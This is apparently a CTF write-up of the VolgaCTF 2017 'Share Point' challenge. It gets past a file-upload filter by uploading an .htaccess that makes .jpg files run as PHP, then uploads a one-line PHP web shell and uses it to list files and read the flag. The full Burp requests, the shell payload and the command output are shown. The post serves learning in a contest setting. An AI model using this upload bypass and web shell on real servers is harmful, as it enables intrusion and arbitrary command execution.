{"metadata":{"date":"Mar 28, 2017","title":"VolgaCTF - Share Point writeup","template":"post","slug":"volgactf-share-point-writeup","categories":["CTF"],"tags":["CTF"]},"content":"<pre><code class=\"hljs language-pgsql\"><span class=\"hljs-keyword\">Share</span> <span class=\"hljs-type\">Point</span>\n\nLook! I wrote a good service <span class=\"hljs-keyword\">for</span> sharing your files <span class=\"hljs-keyword\">with</span> your friends, enjoy)\n<span class=\"hljs-keyword\">share</span>-<span class=\"hljs-type\">point</span>.quals<span class=\"hljs-number\">.2017</span>.volgactf.ru\n</code></pre>\n<p>The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.</p>\n<p>Uploading files with a <code>.php</code> extension got rejected. I tried some tricks when trying to upload my <code>shell.php</code>:</p>\n<ul>\n<li>Chaning the Content Type to <code>image/jpeg</code>.</li>\n<li>Injecting null values in the filename <code>shell.php\\00.gif</code>.</li>\n<li>Uploading a file with the magic headers of a gif file.</li>\n</ul>\n<p>Next I tried to upload an <code>.htaccess</code> file with the following contents <code>AddType application/x-httpd-php .jpg</code>, this would cause <code>.jpg</code> files to executed as <code>.php</code> files, and it worked!</p>\n<p>The following code snippet shows the HTTP POST request from Burp Suite when uploading the <code>.htaccess</code> file and the following <code>shell.php.jpg</code>.</p>\n<pre><code class=\"hljs language-http\"><span class=\"hljs-keyword\">POST</span> <span class=\"hljs-string\">/upload.php</span> <span class=\"hljs-meta\">HTTP/1.1</span>\n<span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>share-point.quals.2017.volgactf.ru\n<span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0\n<span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>*/*\n<span class=\"hljs-attribute\">Accept-Language</span><span class=\"hljs-punctuation\">: </span>en-US,en;q=0.5\n<span class=\"hljs-attribute\">Referer</span><span class=\"hljs-punctuation\">: </span>http://share-point.quals.2017.volgactf.ru/upload.php\n<span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>271\n<span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>multipart/form-data; boundary=---------------------------1620217569904038223723611436\n<span class=\"hljs-attribute\">Cookie</span><span class=\"hljs-punctuation\">: </span>PHPSESSID=gsl3b673of0kbvaav8am0vs690\n<span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close\n\n<span class=\"applescript\"><span class=\"hljs-comment\">-----------------------------1620217569904038223723611436</span>\nContent-Disposition: form-data; <span class=\"hljs-built_in\">name</span>=<span class=\"hljs-string\">\"userFile\"</span>; filename=<span class=\"hljs-string\">\".htaccess\"</span>\nContent-Type: <span class=\"hljs-built_in\">application</span>/octet-stream\n\nAddType <span class=\"hljs-built_in\">application</span>/x-httpd-php .jpg\n\n<span class=\"hljs-comment\">-----------------------------1620217569904038223723611436--</span>\n</span></code></pre>\n<pre><code class=\"hljs language-http\"><span class=\"hljs-keyword\">POST</span> <span class=\"hljs-string\">/upload.php</span> <span class=\"hljs-meta\">HTTP/1.1</span>\n<span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>share-point.quals.2017.volgactf.ru\n<span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0\n<span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>*/*\n<span class=\"hljs-attribute\">Accept-Language</span><span class=\"hljs-punctuation\">: </span>en-US,en;q=0.5\n<span class=\"hljs-attribute\">Referer</span><span class=\"hljs-punctuation\">: </span>http://share-point.quals.2017.volgactf.ru/upload.php\n<span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>256\n<span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>multipart/form-data; boundary=---------------------------5375118911646132755521388984\n<span class=\"hljs-attribute\">Cookie</span><span class=\"hljs-punctuation\">: </span>PHPSESSID=gsl3b673of0kbvaav8am0vs690\n<span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close\n\n<span class=\"php\">-----------------------------<span class=\"hljs-number\">5375118911646132755521388984</span>\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"userFile\"</span>; filename=<span class=\"hljs-string\">\"shell.php.jpg\"</span>\nContent-Type: image/jpeg\n\n<span class=\"hljs-meta\">&#x3C;?php</span> system(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'cmd'</span>]); <span class=\"hljs-meta\">?></span>\n\n-----------------------------<span class=\"hljs-number\">5375118911646132755521388984</span>--\n</span></code></pre>\n<p>Once we have uploaded the shell, we can start looking for the flag on the file system.</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">http</span>://share-point.quals.<span class=\"hljs-number\">2017</span>.volgactf.ru/files/Smacker<span class=\"hljs-number\">1</span>/shell.php.jpg?cmd=ls -lah\n\n<span class=\"hljs-attribute\">total</span> <span class=\"hljs-number\">24</span>K\n<span class=\"hljs-attribute\">drwxr</span>-xr-x   <span class=\"hljs-number\">2</span> www-data www-data <span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">0</span>K Mar <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">05</span> .\n<span class=\"hljs-attribute\">drwxr</span>-xr-x <span class=\"hljs-number\">252</span> www-data www-data  <span class=\"hljs-number\">12</span>K Mar <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">04</span> ..\n-<span class=\"hljs-attribute\">rw</span>-r--r--   <span class=\"hljs-number\">1</span> www-data www-data   <span class=\"hljs-number\">37</span> Mar <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">04</span> .htaccess\n-<span class=\"hljs-attribute\">rw</span>-r--r--   <span class=\"hljs-number\">1</span> www-data www-data   <span class=\"hljs-number\">31</span> Mar <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">05</span> shell.php.jpg\n</code></pre>\n<p>By pure luck I checked the <code>/opt/</code> folder and found <code>flag.txt</code>. Otherwise I would have simply searched for \"flag\".</p>\n<pre><code class=\"hljs language-awk\">http:<span class=\"hljs-regexp\">//</span>share-point.quals.<span class=\"hljs-number\">2017</span>.volgactf.ru<span class=\"hljs-regexp\">/files/</span>shell.php.jpg?cmd=cat <span class=\"hljs-regexp\">/opt/</span>flag.txt\nVolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}\n</code></pre>"}